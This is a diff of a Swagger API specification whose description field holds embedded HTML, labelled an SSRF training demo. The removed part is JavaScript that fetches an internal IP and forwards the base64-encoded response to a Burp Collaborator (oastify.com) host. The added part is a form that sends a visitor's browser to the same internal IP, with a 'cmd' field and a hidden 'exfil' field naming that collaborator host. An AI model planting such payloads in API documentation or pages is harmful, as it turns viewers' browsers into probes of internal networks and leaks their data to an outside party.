@@ -1,59 +1,34 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Advanced Demo Login Page
-  description: '
-    <div class="login-form">
-      <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffeeba; text-align: center;">
-        <strong>Training / Demo Only</strong><br>
-        This demo simulates internal metadata/IP discovery.
+  title: SSRF Training Demo
+  description: |
+    <div style="font-family: sans-serif; border: 1px solid #ccc; padding: 20px; border-radius: 10px;">
+      <h3 style="color: #d9534f;">Internal Admin Portal</h3>
+      <p>This demo simulates a <b>Server-Side Request Forgery</b> or <b>Internal Redirect</b>.</p>
+      
+      <div style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
+        <form action="http://10.83.34.78/" method="GET">
+          <div style="margin-bottom: 10px;">
+            <label>Internal Command:</label><br>
+            <input type="text" name="cmd" value="get_server_status" style="width: 100%; padding: 5px;">
+          </div>
+          
+          <input type="hidden" name="exfil" value="txu5p50087ousiad5ff33sgcq3wukk89.oastify.com">
+          
+          <button type="submit" style="background: #0275d8; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px;">
+            Authorize & Login
+          </button>
+        </form>
       </div>
-
-      <div class="heading">
-        <h1 style="text-align: center; font-size: 24px; color: #333;">Security Training Login</h1>
-        <div style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px;">
-          <form id="demoForm">
-            <div style="margin-bottom: 15px;">
-              <label style="font-size: 14px;">Username</label>
-              <input type="text" id="user" name="username" value="admin" style="width: 100%; padding: 10px; border: 1px solid #ccc;">
-            </div>
-            <div style="margin-bottom: 15px;">
-              <label style="font-size: 14px;">Password</label>
-              <input type="password" id="pass" name="password" value="password123" style="width: 100%; padding: 10px; border: 1px solid #ccc;">
-            </div>
-            <button type="button" onclick="handleDemoLogin()" style="width: 100%; padding: 12px; background-color: #d9534f; color: white; border: none; cursor: pointer;">
-              Authorize & Login
-            </button>
-          </form>
-        </div>
-      </div>
+      
+      <p style="font-size: 11px; color: #666; margin-top: 10px;">
+        <b>Demo Goal:</b> Click the button to see the browser attempt to connect to the internal IP <code>10.83.34.78</code>.
+      </p>
     </div>
-
-    <script>
-      async function handleDemoLogin() {
-        const internalIp = "http://10.83.34.78/"; // Target internal IP
-        const collaborator = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/exfil";
-        
-        try {
-          // 1. Attempt to fetch from internal IP (Demonstrating SSRF/Internal reach)
-          const response = await fetch(internalIp);
-          const internalData = await response.text();
-          
-          // 2. Send the internal response data to Burp Collaborator
-          fetch(collaborator + "?data=" + btoa(internalData));
-          
-          alert("Demo Action: Internal data retrieved and forwarded to collaborator.");
-        } catch (e) {
-          // If the IP is unreachable, we still notify the collaborator that the attempt happened
-          fetch(collaborator + "?error=unreachable_internal_ip");
-          alert("Internal IP unreachable, but request logged to collaborator.");
-        }
-      }
-    </script>
-    '
 paths:
-  /demo-login:
-    post:
+  /demo:
+    get:
       responses:
         '200':
           description: OK
